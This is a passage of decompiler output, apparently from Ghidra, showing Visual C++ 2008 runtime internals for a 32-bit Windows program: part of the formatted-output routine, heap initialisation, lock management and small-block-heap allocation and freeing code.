                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 3;
              }
              else {
                ppiVar8 = (int **)_ArgList;
                if (((((wVar1 != L'd') && (wVar1 != L'i')) && (wVar1 != L'o')) &&
                    ((wVar1 != L'u' && (wVar1 != L'x')))) && (wVar1 != L'X')) {
                  local_438 = 0;
                  goto switchD_0040db1b_caseD_0;
                }
              }
            }
            else if (local_420 == (byte *)0x68) {
              local_40c = local_40c | 0x20;
              ppiVar8 = (int **)_ArgList;
            }
            else if (local_420 == (byte *)0x6c) {
              if (*pwVar11 == L'l') {
                local_40c = local_40c | 0x1000;
                ppiVar8 = (int **)_ArgList;
                pwVar11 = _Format + 2;
              }
              else {
                local_40c = local_40c | 0x10;
                ppiVar8 = (int **)_ArgList;
              }
            }
            else {
              ppiVar8 = (int **)_ArgList;
              if (local_420 == (byte *)0x77) {
                local_40c = local_40c | 0x800;
              }
            }
            break;
          case 7:
            if (local_420 < (byte *)0x65) {
              if (local_420 == (byte *)0x64) {
LAB_0040e01b:
                local_40c = local_40c | 0x40;
LAB_0040e022:
                local_420 = (byte *)0xa;
LAB_0040e02c:
                if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((local_40c & 0x20) == 0) {
                    piVar3 = *(int **)_ArgList;
                    if ((local_40c & 0x40) == 0) {
                      piVar9 = (int *)0x0;
                    }
                    else {
                      piVar9 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_40c & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)_ArgList;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)_ArgList;
                    }
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  local_41c = (int **)((int)_ArgList + 8);
                  piVar3 = *(int **)_ArgList;
                  piVar9 = *(int **)((int)_ArgList + 4);
                }
                if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                  local_40c = local_40c | 0x100;
                }
                if ((local_40c & 0x9000) == 0) {
                  piVar9 = (int *)0x0;
                }
                lVar13 = CONCAT44(piVar9,piVar3);
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x1;
                }
                else {
                  local_40c = local_40c & 0xfffffff7;
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar9) == 0) {
                  local_428 = 0;
                }
                piVar3 = &local_209;
                while( true ) {
                  piVar9 = (int *)((int)local_410 + -1);
                  if (((int)local_410 < 1) && (lVar13 == 0)) break;
                  local_410 = piVar9;
                  lVar13 = __aulldvrm((uint)lVar13,(uint)((ulonglong)lVar13 >> 0x20),(uint)local_420
                                      ,(int)local_420 >> 0x1f);
                  iVar6 = extraout_ECX + 0x30;
                  if (0x39 < iVar6) {
                    iVar6 = iVar6 + local_458;
                  }
                  *(byte *)piVar3 = (byte)iVar6;
                  piVar3 = (int *)((int)piVar3 + -1);
                }
                local_418 = (byte *)((int)&local_209 + -(int)piVar3);
                local_414 = (int *)((int)piVar3 + 1);
                local_410 = piVar9;
                if (((local_40c & 0x200) != 0) &&
                   ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                  *(byte *)piVar3 = 0x30;
                  local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                  local_414 = piVar3;
                }
              }
              else if (local_420 < (byte *)0x54) {
                if (local_420 == (byte *)0x53) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
                  goto LAB_0040ddfa;
                }
                if (local_420 != (byte *)0x41) {
                  if (local_420 == (byte *)0x43) {
                    if ((local_40c & 0x830) == 0) {
                      local_40c = local_40c | 0x20;
                    }
LAB_0040dea4:
                    wVar2 = *(wchar_t *)_ArgList;
                    local_468 = (uint)(ushort)wVar2;
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    if ((local_40c & 0x20) == 0) {
                      local_408[0]._0_2_ = wVar2;
                    }
                    else {
                      local_43c = (char)wVar2;
                      local_43b = 0;
                      iVar6 = __mbtowc_l((wchar_t *)local_408,&local_43c,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                      if (iVar6 < 0) {
                        local_454 = 1;
                      }
                    }
                    local_418 = (byte *)0x1;
                    local_414 = local_408;
                    goto LAB_0040e36a;
                  }
                  if ((local_420 != (byte *)0x45) && (local_420 != (byte *)0x47)) goto LAB_0040e36a;
                }
                local_420 = local_420 + 0x20;
                local_460 = 1;
LAB_0040dd91:
                local_40c = local_40c | 0x40;
                local_418 = (byte *)0x200;
                piVar3 = local_408;
                pbVar10 = local_418;
                piVar9 = local_408;
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x6;
                }
                else if (local_410 == (int *)0x0) {
                  if ((short)local_420 == 0x67) {
                    local_410 = (int *)0x1;
                  }
                }
                else {
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                  if (0xa3 < (int)local_410) {
                    pbVar10 = (byte *)((int)local_410 + 0x15d);
                    local_414 = local_408;
                    local_45c = (int *)__malloc_crt((size_t)pbVar10);
                    piVar3 = local_45c;
                    piVar9 = local_45c;
                    if (local_45c == (int *)0x0) {
                      local_410 = (int *)0xa3;
                      piVar3 = local_408;
                      pbVar10 = local_418;
                      piVar9 = local_414;
                    }
                  }
                }
                local_414 = piVar9;
                local_418 = pbVar10;
                local_470 = *(int **)_ArgList;
                local_41c = (int **)((int)_ArgList + 8);
                local_46c = *(int **)((int)_ArgList + 4);
                plVar16 = &local_450;
                uVar14 = CONCAT44(local_410,(int)(char)local_420);
                ppiVar8 = &local_470;
                piVar9 = piVar3;
                pbVar10 = local_418;
                uVar15 = local_460;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422df8);
                (*pcVar5)(ppiVar8,piVar9,pbVar10,uVar14,uVar15,plVar16);
                uVar4 = local_40c & 0x80;
                if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422e04);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (((short)local_420 == 0x67) && (uVar4 == 0)) {
                  plVar16 = &local_450;
                  piVar9 = piVar3;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00422e00);
                  (*pcVar5)(piVar9,plVar16);
                }
                if (*(byte *)piVar3 == 0x2d) {
                  local_40c = local_40c | 0x100;
                  piVar3 = (int *)((int)piVar3 + 1);
                  local_414 = piVar3;
                }
LAB_0040df7d:
                local_418 = (byte *)_strlen((char *)piVar3);
              }
              else {
                if (local_420 == (byte *)0x58) goto LAB_0040e17b;
                if (local_420 == (byte *)0x5a) {
                  piVar3 = *(int **)_ArgList;
                  local_41c = (int **)((int)_ArgList + 4);
                  if ((piVar3 == (int *)0x0) ||
                     (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                    local_414 = (int *)PTR_DAT_00422db8;
                    piVar3 = (int *)PTR_DAT_00422db8;
                    goto LAB_0040df7d;
                  }
                  local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                  if ((local_40c & 0x800) != 0) {
                    iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                    goto LAB_0040e362;
                  }
                  local_42c = 0;
                }
                else {
                  if (local_420 == (byte *)0x61) goto LAB_0040dd91;
                  if (local_420 == (byte *)0x63) goto LAB_0040dea4;
                }
              }
LAB_0040e36a:
              pbVar10 = local_418;
              if (local_454 == 0) {
                if ((local_40c & 0x40) != 0) {
                  if ((local_40c & 0x100) == 0) {
                    if ((local_40c & 1) == 0) {
                      if ((local_40c & 2) == 0) goto LAB_0040e3ac;
                      local_434 = 0x20;
                    }
                    else {
                      local_434 = 0x2b;
                    }
                  }
                  else {
                    local_434 = 0x2d;
                  }
                  local_428 = 1;
                }
LAB_0040e3ac:
                pbVar7 = (byte *)((int)local_430 + (-local_428 - (int)local_418));
                if ((local_40c & 0xc) == 0) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
                _write_string(&local_434,local_428);
                if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                  _write_multi_char(L'0',(int)pbVar7);
                }
                if ((local_42c == 0) && (0 < (int)pbVar10)) {
                  local_420 = pbVar10;
                  piVar3 = local_414;
                  do {
                    local_420 = local_420 + -1;
                    iVar6 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 1) {
                      local_424 = -1;
                      break;
                    }
                    _write_char((wchar_t)local_468);
                    piVar3 = (int *)((int)piVar3 + iVar6);
                  } while (0 < (int)local_420);
                }
                else {
                  _write_string(local_414,(int)pbVar10);
                }
                if ((-1 < local_424) && ((local_40c & 4) != 0)) {
                  _write_multi_char(L' ',(int)pbVar7);
                }
              }
            }
            else {
              if ((byte *)0x70 < local_420) {
                if (local_420 == (byte *)0x73) {
LAB_0040ddfa:
                  piVar3 = local_410;
                  if (local_410 == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_41c = (int **)((int)_ArgList + 4);
                  local_414 = *(int **)_ArgList;
                  if ((local_40c & 0x20) == 0) {
                    piVar9 = local_414;
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_u__null__00422dbc;
                      piVar9 = (int *)PTR_u__null__00422dbc;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                        piVar9 = (int *)((int)piVar9 + 2)) {
                    }
                    iVar6 = (int)piVar9 - (int)local_414;
LAB_0040e362:
                    local_41c = (int **)((int)_ArgList + 4);
                    local_42c = 1;
                    local_418 = (byte *)(iVar6 >> 1);
                  }
                  else {
                    if (local_414 == (int *)0x0) {
                      local_414 = (int *)PTR_DAT_00422db8;
                    }
                    local_418 = (byte *)0x0;
                    piVar9 = local_414;
                    if (0 < (int)piVar3) {
                      do {
                        if (*(byte *)piVar9 == 0) break;
                        iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                        if (iVar6 != 0) {
                          piVar9 = (int *)((int)piVar9 + 1);
                        }
                        piVar9 = (int *)((int)piVar9 + 1);
                        local_418 = local_418 + 1;
                      } while ((int)local_418 < (int)piVar3);
                    }
                  }
                  goto LAB_0040e36a;
                }
                if (local_420 == (byte *)0x75) goto LAB_0040e022;
                if (local_420 != (byte *)0x78) goto LAB_0040e36a;
                local_458 = 0x27;
LAB_0040e1ab:
                local_420 = (byte *)0x10;
                if ((local_40c & 0x80) != 0) {
                  local_434 = 0x30;
                  local_432 = (short)local_458 + 0x51;
                  local_428 = 2;
                }
                goto LAB_0040e02c;
              }
              if (local_420 == (byte *)0x70) {
                local_410 = (int *)0x8;
LAB_0040e17b:
                local_458 = 7;
                goto LAB_0040e1ab;
              }
              if (local_420 < (byte *)0x65) goto LAB_0040e36a;
              if (local_420 < (byte *)0x68) goto LAB_0040dd91;
              if (local_420 == (byte *)0x69) goto LAB_0040e01b;
              if (local_420 != (byte *)0x6e) {
                if (local_420 != (byte *)0x6f) goto LAB_0040e36a;
                local_420 = (byte *)0x8;
                if ((local_40c & 0x80) != 0) {
                  local_40c = local_40c | 0x200;
                }
                goto LAB_0040e02c;
              }
              piVar3 = *(int **)_ArgList;
              local_41c = (int **)((int)_ArgList + 4);
              iVar6 = __get_printf_count_output();
              if (iVar6 == 0) goto switchD_0040db1b_caseD_9;
              if ((local_40c & 0x20) == 0) {
                *piVar3 = local_424;
              }
              else {
                *(ushort *)piVar3 = (ushort)local_424;
              }
              local_454 = 1;
            }
            ppiVar8 = local_41c;
            pwVar11 = local_464;
            if (local_45c != (int *)0x0) {
              _free(local_45c);
              local_45c = (int *)0x0;
              ppiVar8 = local_41c;
              pwVar11 = local_464;
            }
            break;
          default:
            goto switchD_0040db1b_caseD_9;
          case 0xbad1abe1:
            break;
          }
          local_420 = (byte *)(uint)(ushort)*pwVar11;
          _ArgList = (va_list)ppiVar8;
          _Format = pwVar11;
        } while (*pwVar11 != L'\0');
        if ((local_438 != 0) && (local_438 != 7)) goto LAB_0040da80;
      }
      if (local_444 != '\0') {
        *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
      }
      goto LAB_0040e549;
    }
LAB_0040da80:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_444 != '\0') {
    *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
  }
LAB_0040e549:
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_004237bc = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_004237bc == (HANDLE)0x0) {
    return 0;
  }
  DAT_0042510c = 1;
  return 1;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_004237c0;
  do {
    if ((&DAT_00422554)[iVar2 * 2] == 1) {
      (&DAT_00422550)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_00422550)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00422550)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422550;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x422670);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00422550;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x422670);
  return;
}



void __cdecl FUN_0040e64c(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00422550)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_004237bc == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00422550 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_0040e71d();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_0040e71d(void)

{
  FUN_0040e64c(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00422550)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00422550)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_004250f8;
  while( true ) {
    if (DAT_004250f4 * 0x14 + DAT_004250f8 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_00423910 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_00425108 * 0x8000 + DAT_00423910[3]),0x8000,0x4000);
        DAT_00423910[2] = DAT_00423910[2] | 0x80000000U >> ((byte)DAT_00425108 & 0x1f);
        *(undefined4 *)(DAT_00423910[4] + 0xc4 + DAT_00425108 * 4) = 0;
        *(char *)(DAT_00423910[4] + 0x43) = *(char *)(DAT_00423910[4] + 0x43) + -1;
        if (*(char *)(DAT_00423910[4] + 0x43) == '\0') {
          DAT_00423910[1] = DAT_00423910[1] & 0xfffffffe;
        }
        if (DAT_00423910[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_00423910[3],0,0x8000);
          HeapFree(DAT_004237bc,0,(LPVOID)DAT_00423910[4]);
          _memmove(DAT_00423910,DAT_00423910 + 5,
                   (DAT_004250f4 * 0x14 - (int)DAT_00423910) + -0x14 + DAT_004250f8);
          DAT_004250f4 = DAT_004250f4 + -1;
          if (DAT_00423910 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_00425100 = DAT_004250f8;
        }
      }
      DAT_00423910 = param_1;
      DAT_00425108 = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_004250f4 == DAT_00425104) {
    pvVar1 = HeapReAlloc(DAT_004237bc,0,DAT_004250f8,(DAT_00425104 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00425104 = DAT_00425104 + 0x10;
    DAT_004250f8 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_004250f4 * 0x14 + (int)DAT_004250f8);
  pvVar1 = HeapAlloc(DAT_004237bc,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_004250f4 = DAT_004250f4 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_004237bc,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
